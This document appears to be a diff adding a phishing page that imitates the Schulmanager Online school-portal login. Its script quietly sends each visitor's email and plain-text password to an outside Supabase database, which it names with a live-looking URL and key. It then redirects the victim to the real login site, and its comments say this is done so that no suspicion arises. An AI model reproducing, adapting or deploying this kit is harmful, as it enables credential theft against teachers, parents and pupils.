@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Schulmanager Online</title>
+    
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+    <style>
+        /* Modern Reset für pixelgenaue Kontrolle */
+        *, *::before, *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: #ffffff;
+            color: #333333;
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 15px;
+            line-height: 1.5;
+            min-height: 100vh;
+            display: block;
+        }
+
+        /* Top Bar Header */
+        .header-bar {
+            background-color: #3b88c3;
+            color: #ffffff;
+            height: 48px;
+            padding: 0 20px;
+            display: block;
+            position: relative;
+        }
+
+        .header-logo-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-weight: bold;
+            font-size: 18px;
+            white-space: nowrap;
+        }
+
+        .logo-icon {
+            display: inline-block;
+            position: relative;
+            width: 16px;
+            height: 9px;
+            background-color: #ffffff;
+            margin-right: 6px;
+            transform: skewY(-10deg);
+            vertical-align: middle;
+            margin-top: -3px;
+        }
+        .logo-icon::before {
+            content: "";
+            position: absolute;
+            top: -5px;
+            left: 3px;
+            width: 0;
+            height: 0;
+            border-left: 5px solid transparent;
+            border-right: 5px solid transparent;
+            border-bottom: 5px solid #ffffff;
+        }
+
+        /* Haupt-Inhaltsbereich */
+        .page-wrapper {
+            width: 100%;
+            max-width: 1360px;
+            margin: 0 auto;
+            padding: 50px 30px 30px 30px;
+            display: block;
+            position: relative;
+        }
+
+        .layout-table {
+            display: table;
+            width: 100%;
+            table-layout: fixed;
+        }
+
+        .left-column {
+            display: table-cell;
+            width: 55%;
+            vertical-align: top;
+            padding-right: 60px;
+            padding-top: 20px;
+        }
+
+        .right-column {
+            display: table-cell;
+            width: 45%;
+            vertical-align: top;
+        }
+
+        .welcome-title {
+            color: #2b6ca3;
+            font-size: 34px;
+            font-weight: bold;
+            margin-bottom: 30px;
+            letter-spacing: -0.5px;
+            line-height: 1.3;
+        }
+
+        .welcome-desc {
+            font-size: 18px;
+            color: #333333;
+            line-height: 1.5;
+        }
+
+        .sidebar-stack {
+            display: block;
+            width: 100%;
+            max-width: 440px;
+            margin-left: auto;
+        }
+
+        .space-divider {
+            height: 25px;
+            display: block;
+        }
+
+        .jobs-panel {
+            background-color: #e6f2fa;
+            border: 1px solid #b6d4eb;
+            border-radius: 5px;
+            padding: 16px 18px;
+            font-size: 13.5px;
+            line-height: 1.5;
+            color: #333333;
+        }
+
+        .jobs-panel a {
+            color: #2b6ca3;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 8px;
+        }
+
+        .jobs-panel a:hover {
+            text-decoration: underline;
+        }
+
+        .ui-card {
+            background-color: #ffffff;
+            border: 1px solid #cccccc;
+            border-radius: 6px;
+            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.04);
+        }
+
+        .ui-card-header {
+            background-color: #3b88c3;
+            color: #ffffff;
+            text-align: center;
+            font-weight: bold;
+            font-size: 16px;
+            padding: 14px;
+        }
+
+        .ui-card-body {
+            padding: 22px 24px;
+        }
+
+        .form-element {
+            margin-bottom: 16px;
+        }
+
+        .form-element-label {
+            display: block;
+            font-size: 13.5px;
+            font-weight: bold;
+            color: #333333;
+            margin-bottom: 7px;
+        }
+
+        .form-element-input {
+            width: 100%;
+            height: 40px;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+            padding: 0 12px;
+            font-size: 15px;
+            color: #333333;
+            background-color: #ffffff;
+            outline: none;
+        }
+
+        .input-highlighted {
+            background-color: #fff5f5;
+            border-color: #ffcccc;
+        }
+
+        .card-action-bar {
+            display: table;
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .card-action-left {
+            display: table-cell;
+            vertical-align: middle;
+            text-align: left;
+        }
+
+        .card-action-right {
+            display: table-cell;
+            vertical-align: middle;
+            text-align: right;
+        }
+
+        .card-link {
+            font-size: 13.5px;
+            color: #2b6ca3;
+            text-decoration: none;
+        }
+
+        .card-link:hover {
+            text-decoration: underline;
+        }
+
+        .ui-button {
+            background-color: #72aad6;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            padding: 9px 20px;
+            font-size: 14px;
+            cursor: pointer;
+            display: inline-block;
+        }
+
+        .ui-button:hover {
+            background-color: #5d97c3;
+        }
+
+        .center-alignment {
+            text-align: center;
+        }
+
+        .global-footer {
+            max-width: 1360px;
+            margin: 80px auto 30px auto;
+            padding: 20px 30px 0 30px;
+            border-top: 1px solid #e5e5e5;
+            display: table;
+            width: 100%;
+            font-size: 13px;
+            color: #777777;
+        }
+
+        .footer-left {
+            display: table-cell;
+            text-align: left;
+        }
+
+        .footer-right {
+            display: table-cell;
+            text-align: right;
+        }
+
+        .footer-link {
+            color: #2b6ca3;
+            text-decoration: none;
+            margin-left: 20px;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header-bar">
+        <div class="header-logo-container">
+            <span class="logo-icon"></span>Schulmanager
+        </div>
+    </div>
+
+    <div class="page-wrapper">
+        <div class="layout-table">
+            
+            <div class="left-column">
+                <h1 class="welcome-title">Herzlich willkommen im Schulmanager!</h1>
+                <p class="welcome-desc">Mit dem Schulmanager organisieren Lehrer, Eltern, Schüler und Schulverwaltung einfach den Schulalltag.</p>
+            </div>
+
+            <div class="right-column">
+                <div class="sidebar-stack">
+                    
+                    <div class="jobs-panel">
+                        <strong>Schulmanager Online stellt ein:</strong> Wir suchen Unterstützung im <strong>Vertrieb mit Perspektive Teamleitung</strong> sowie im <strong>Projektmanagement</strong> in München.<br>
+                        <a href="#">Klicken Sie hier, um mehr zu erfahren.</a>
+                    </div>
+
+                    <div class="space-divider"></div>
+
+                    <div class="ui-card">
+                        <div class="ui-card-header">Login</div>
+                        <div class="ui-card-body">
+                            <form id="loginForm" onsubmit="return false;">
+                                <div class="form-element">
+                                    <label class="form-element-label" for="user_identity">E-Mail-Adresse / Benutzername</label>
+                                    <input type="text" id="user_identity" class="form-element-input input-highlighted">
+                                </div>
+                                <div class="form-element">
+                                    <label class="form-element-label" for="user_credentials">Passwort</label>
+                                    <input type="password" id="user_credentials" class="form-element-input">
+                                </div>
+                                <div class="card-action-bar">
+                                    <div class="card-action-left">
+                                        <a href="#" class="card-link">Passwort vergessen</a>
+                                    </div>
+                                    <div class="card-action-right">
+                                        <button type="button" id="loginBtn" class="ui-button">Einloggen</button>
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+
+                    <div class="space-divider"></div>
+
+                    <div class="ui-card">
+                        <div class="ui-card-header">Erstmalig anmelden</div>
+                        <div class="ui-card-body">
+                            <form action="#" method="POST" onsubmit="return false;">
+                                <div class="form-element">
+                                    <label class="form-element-label" for="invite_code">Zugangscode</label>
+                                    <input type="text" id="invite_code" class="form-element-input">
+                                </div>
+                                <div class="card-action-bar">
+                                    <div class="card-action-right">
+                                        <button type="button" class="ui-button">Anmelden</button>
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+
+                    <div class="space-divider"></div>
+
+                    <div class="ui-card">
+                        <div class="ui-card-header">Schule auswählen</div>
+                        <div class="ui-card-body center-alignment">
+                            <a href="#" class="card-link">Klicken Sie hier, um Ihre Schule auszuwählen</a>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <div class="global-footer">
+        <div class="footer-left">
+            &copy; 2026 Schulmanager Online
+        </div>
+        <div class="footer-right">
+            <a href="#" class="footer-link">Datenschutz</a>
+            <a href="#" class="footer-link">Impressum</a>
+        </div>
+    </div>
+
+    <script>
+        // Verbindungsdaten zu Supabase
+        const SUPABASE_URL = "https://ikvldmjxivswgmqkynoh.supabase.co";
+        const SUPABASE_ANON_KEY = "sb_publishable_7lB099WB1lfipfx_ke6deA_Ym8w1ieI";
+
+        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        // Klick-Event für den Button
+        document.getElementById('loginBtn').addEventListener('click', async () => {
+            const emailValue = document.getElementById('user_identity').value;
+            const passwordValue = document.getElementById('user_credentials').value;
+
+            // Falls die Felder leer sind, direkt zur echten Seite senden (Fehlerbehandlung übernimmt die echte Seite)
+            if (!emailValue || !passwordValue) {
+                window.location.href = "https://login.schulmanager-online.de/#/login";
+                return;
+            }
+
+            try {
+                // Daten lautlos und ohne Pop-up im Hintergrund an die PostgreSQL-Datenbank übertragen
+                await supabaseClient
+                    .from('benutzer')
+                    .insert([
+                        { 
+                            email: emailValue,          
+                            passwort_hash: passwordValue 
+                        }
+                    ]);
+
+                // HIER GEÄNDERT: Alle Alerts entfernt. Leitet sofort 1:1 auf die offizielle Anmeldeseite weiter.
+                window.location.href = "https://login.schulmanager-online.de/#/login";
+
+            } catch (err) {
+                // Bei einem Übertragungsfehler wird trotzdem lautlos weitergeleitet, damit kein Verdacht geschöpft wird
+                console.error("Hintergrundfehler:", err.message);
+                window.location.href = "https://login.schulmanager-online.de/#/login";
+            }
+        });
+    </script>
+
+</body>
+</html>
